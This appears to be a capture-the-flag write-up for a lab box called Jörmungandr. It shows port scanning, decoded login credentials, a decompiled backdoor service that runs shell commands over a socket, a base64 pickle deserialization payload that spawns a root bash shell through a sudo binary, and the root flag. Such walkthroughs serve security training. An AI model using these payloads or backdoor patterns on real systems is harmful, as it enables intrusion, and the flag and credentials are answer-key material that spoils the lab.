# Jörmungandr

## Enumeration
```bash
└─$ sudo nmap -sS -A 10.10.249.240                            
[sudo] password for marius: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 12:15 BST
Nmap scan report for 10.10.249.240
Host is up (0.035s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           124 Jan 19  2022 poem.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.37.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
Aggressive OS guesses: Linux 3.10 - 3.13 (89%), Linux 5.4 (89%), Linux 3.10 - 4.11 (88%), Linux 3.12 (88%), Linux 3.13 (88%), Linux 3.13 or 4.2 (88%), Linux 3.2 - 3.5 (88%), Linux 3.2 - 3.8 (88%), Linux 4.2 (88%), Linux 4.4 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT      ADDRESS
1   35.66 ms 10.8.0.1
2   36.08 ms 10.10.249.240
```
### I go to the ftp and I found the .hidden file
```bash
get .hidden
```
## Exploitation

### In this file, I got python pickle encoded in binary

### After decoding with script i got this : 
```bash
└─$ python3 script.py
Username: fenrir
Password: I_will_kill_odin_during_ragnarok
```
### I go on the fenrir ssh and I found the mjollnir.pyc file

## User FLAG

I forgot to write it :(

## Privilege Escalation

```bash
└─$ uncompyle6 mjollnir.pyc 
```
```python
# uncompyle6 version 3.9.1
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0]
# Embedded file name: .mjollnir.py
# Compiled at: 2022-01-19 13:49:25
# Size of source mod 2**32: 2225 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(128672430374905338731062386L)
password = long_to_bytes(33643248411776211125062560554130339746417025421355137140099645078910060553582L)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'C:\\User\\Jormungandr> ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print("Starting server...")
    port = 7432
    host = "0.0.0.0"
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print("Server started on " + str(server.server_address) + "!")
    while True:
        sleep(10)


if __name__ == "__main__":
    main()
```
```bash
└─$ python decode.py         
b'jormungandr'
b'Jag_ar_Jormungandr_midgardsormen'
```
### I go on the jormungandr ssh session

### I follow this tuto https://medium.com/@cuncis/implanting-ssh-keys-a-step-by-step-guide-with-command-examples-f57b21690854

```bash
sudo /opt/ragnarok/ragnarok
```

#### try 1 : bash
```Error: If this is your last meal, include at least a pickle in it!```
#### try 2 : pickle
```Error: the meal is 64 times worst than I thought```
#### (find a write up for this) try 3 :
```gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARiYXNolIWUUpQu```

```bash
cd /root
```
## Root FLAG
```cat `ls` ```: EPI{deN_hAr_GudarNa2_ErA_GaR_m0T_sITT_sluT}


